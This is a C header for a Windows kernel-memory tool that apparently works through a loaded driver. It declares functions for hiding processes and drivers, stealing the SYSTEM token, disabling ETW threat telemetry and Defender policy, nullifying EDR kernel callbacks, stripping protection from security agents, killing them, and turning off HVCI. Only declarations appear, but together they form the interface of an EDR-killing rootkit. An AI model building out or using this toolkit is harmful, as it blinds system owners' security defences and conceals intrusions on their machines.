#ifndef FT_H
#define FT_H

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0601
#endif

#include <windows.h>
#include <stdint.h>
#include <stddef.h>
#include <stdio.h>

#define FT_OK           0
#define FT_E_ARGS       2
#define FT_E_KM         3
#define FT_E_BUILD      4
#define FT_E_VALIDATE   5
#define FT_E_VERIFY     6
#define FT_E_DRIVER     7
#define FT_E_TARGET     8
#define FT_E_ACTION     9
#define FT_E_PRIV      10
#define FT_E_SVC       11
#define FT_E_REG       12
#define FT_E_ETW       13
#define FT_E_INTERNAL  14

#define FT_MAX_PATH      512
#define FT_MAX_NAME      128
#define FT_MAX_ARGS      64
#define FT_MAX_CB_HITS   64
#define FT_WALK_MAX      8192
#define FT_KERN_MIN      0xFFFF000000000000ULL

typedef struct ft_sb {
    char*  buf;
    size_t len;
    size_t cap;
    int    err;
} ft_sb;

void ft_sb_init(ft_sb* s);
void ft_sb_free(ft_sb* s);
void ft_sb_addf(ft_sb* s, const char* fmt, ...);
void ft_sb_adds(ft_sb* s, const char* str);
void ft_sb_addj(ft_sb* s, const char* str);
void ft_sb_addj_n(ft_sb* s, const char* str, size_t n);

typedef enum {
    FTR_VAL = 0,
    FTR_ZERO,
    FTR_FAIL,
    FTR_CONFLICT
} ft_rr;

typedef struct ft_ctx ft_ctx;

struct ft_ctx {
    HANDLE    dev;
    int       km_ready;
    uint64_t  ntos_base;
    uint32_t  build;
    int       dry_run;
    int       json_out;
    int       verbose;
    ft_sb     json;
    FILE*     status;
    int       fails;
    int       warns;
    char      self_dir[FT_MAX_PATH];
    char      sys_path[FT_MAX_PATH];

    uint64_t  sys_ep;
    uint32_t  ep_pid_off;
    uint32_t  ep_links_off;
    uint32_t  ep_token_off;
    int       ep_luid_delta;
    int       ep_ready;
    int       impersonating;
    uint64_t  sys_token;
};

int     ft_km_open(ft_ctx* c);
void    ft_km_close(ft_ctx* c);
ft_rr   ft_km_read64(ft_ctx* c, uint64_t addr, uint64_t* out);
ft_rr   ft_km_read64_fast(ft_ctx* c, uint64_t addr, uint64_t* out);
ft_rr   ft_km_read32(ft_ctx* c, uint64_t addr, uint32_t* out);
ft_rr   ft_km_read_bytes(ft_ctx* c, uint64_t addr, void* dst, size_t len);
int     ft_km_write(ft_ctx* c, uint64_t addr, const void* src, size_t len);
int     ft_km_write64(ft_ctx* c, uint64_t addr, uint64_t val);
int     ft_km_module_base(ft_ctx* c, const char* name, uint64_t* base);
int     ft_km_load_driver(ft_ctx* c, const char* path, const char* service);
int     ft_is_kernel_ptr(uint64_t v);
uint64_t ft_ntos_base(ft_ctx* c);

typedef struct ft_range {
    uint64_t lo;
    uint64_t hi;
} ft_range;

int ft_ntos_writable_sections(ft_ctx* c, ft_range* out, int max);

typedef struct ft_sec {
    char     name[9];
    uint32_t va;
    uint32_t vsize;
    uint32_t raw_off;
    uint32_t raw_size;
    uint32_t flags;
} ft_sec;

#define FT_SCN_CNT 64

typedef struct ft_pe {
    const uint8_t* data;
    size_t         size;
    uint32_t       image_base;
    uint32_t       nsec;
    ft_sec         sec[FT_SCN_CNT];
    uint32_t       exp_rva;
    uint32_t       exp_size;
    const uint8_t* exp_dir;
    uint32_t       sec_rva;
    uint32_t       sec_size;
} ft_pe;

int      ft_pe_open(const uint8_t* data, size_t size, ft_pe* pe);
int      ft_pe_rva_to_off(const ft_pe* pe, uint32_t rva, size_t len, size_t* off);
int      ft_pe_off_to_rva(const ft_pe* pe, size_t off, uint32_t* rva);
int      ft_pe_export_rva(const ft_pe* pe, const char* name, uint32_t* rva);
int      ft_pe_section_of(const ft_pe* pe, uint32_t rva, const ft_sec** out, int* writable);
int      ft_pe_data_dir(const ft_pe* pe, uint32_t idx, uint32_t* rva, uint32_t* size);
typedef int (*ft_export_cb)(void* ctx, const char* name, uint32_t rva);
int      ft_pe_enum_exports(const ft_pe* pe, ft_export_cb cb, void* ctx);
uint8_t* ft_read_file(const char* path, size_t* out_size);
char*    ft_sysdir_file(const char* name, char* out, size_t cap);
int      ft_ntos_export_rva(ft_ctx* c, const char* name, uint32_t* rva);
int      ft_ntos_rva_bytes(ft_ctx* c, uint32_t rva, void* dst, size_t len);

int      ft_proc_derive_layout(ft_ctx* c);
int      ft_proc_find_by_pid(ft_ctx* c, uint32_t pid, uint64_t* eproc);
int      ft_proc_find_by_name(ft_ctx* c, const char* name, uint32_t* pid);
int      ft_proc_pid_at(ft_ctx* c, uint64_t eproc, uint32_t* pid);
int      ft_proc_walk(ft_ctx* c, uint64_t* eprocs, int max, int* count);
int      ft_proc_self_luid(ft_ctx* c, uint64_t* luid);
int      ft_token_id_of_process(ft_ctx* c, uint32_t pid, uint64_t* token_id);
int      ft_proc_is_system(ft_ctx* c);
uint32_t ft_proc_self_pid(void);

int ft_hide_process(ft_ctx* c, uint32_t pid);
int ft_hide_driver(ft_ctx* c, const char* name);
int ft_mod_range(ft_ctx* c, const char* name, uint64_t* base, uint64_t* size);

int ft_elevate_self(ft_ctx* c);
int ft_elevate_pid(ft_ctx* c, uint32_t pid);
int ft_impersonate_system(ft_ctx* c);
int ft_enable_all_privileges(ft_ctx* c);
void ft_revert_impersonation(ft_ctx* c);
int ft_launch_system(ft_ctx* c, const char* exe, char* const* argv, int visible,
                     uint32_t* child_pid);
int ft_launch_as_pid(ft_ctx* c, uint32_t pid, const char* exe, char* const* argv,
                     int visible, uint32_t* child_pid);

int ft_blind_run(ft_ctx* c, int nuke, int keep_services);
int ft_etwti_discover(uint32_t* handle_rva, uint32_t* etw_reg_rva);
int ft_etwti_disable(ft_ctx* c);
int ft_etw_stop_sessions(ft_ctx* c);
int ft_etw_count_sessions(ft_ctx* c);
int ft_etw_worker_main(const char* out_path, int stop);
int ft_etw_channels(ft_ctx* c);
int ft_defender_policy(ft_ctx* c, int nuke);
int ft_kill_procs(ft_ctx* c, const char* const* names, int n);
int ft_kill_pid(ft_ctx* c, uint32_t pid);
int ft_unprotect_agents(ft_ctx* c, const char* const* names, int n, int raise_self);
int ft_impersonate_ti(ft_ctx* c);
void ft_revert_ti(void);
int ft_services(ft_ctx* c, const char* const* names, int n, int del);
int ft_edr_callbacks(ft_ctx* c, const char* const* drivers, int n);
void ft_edr_set_nullify(int on);
int  ft_edr_nullify_enabled(void);
int ft_add_exclusions(ft_ctx* c, const char* path);
int ft_disarm_live(ft_ctx* c);
int ft_hvci_off(ft_ctx* c);
int ft_reg_get_dword(const char* path, const char* name, DWORD* out);
int ft_reg_set_dword(const char* path, const char* name, DWORD value);
int ft_doctor(ft_ctx* c);
int ft_ppl_offset(ft_ctx* c, uint32_t protected_pid, uint32_t* out_offset);
int ft_ppl_level(ft_ctx* c, uint32_t pid, uint32_t offset, uint32_t* level);
int ft_ppl_set(ft_ctx* c, uint32_t pid, uint32_t offset, uint32_t level);
int ft_ppl_find_agents(ft_ctx* c, const char* const* names, int n, uint32_t* pids, int max);
int ft_list_exports(const char* pattern);
int ft_get_build(uint32_t* out);

void ft_log(ft_ctx* c, const char* level, const char* event, const char* fmt, ...);
void ft_ok(ft_ctx* c, const char* event, const char* fmt, ...);
void ft_info(ft_ctx* c, const char* event, const char* fmt, ...);
void ft_warn(ft_ctx* c, const char* event, const char* fmt, ...);
void ft_err(ft_ctx* c, const char* event, const char* fmt, ...);
void ft_note(ft_ctx* c, const char* fmt, ...);
void ft_esc(char* out, size_t cap, const char* in);
void ft_status_open(ft_ctx* c, const char* path);
void ft_status_close(ft_ctx* c);
void ft_status_raw(ft_ctx* c, const char* json);

#endif
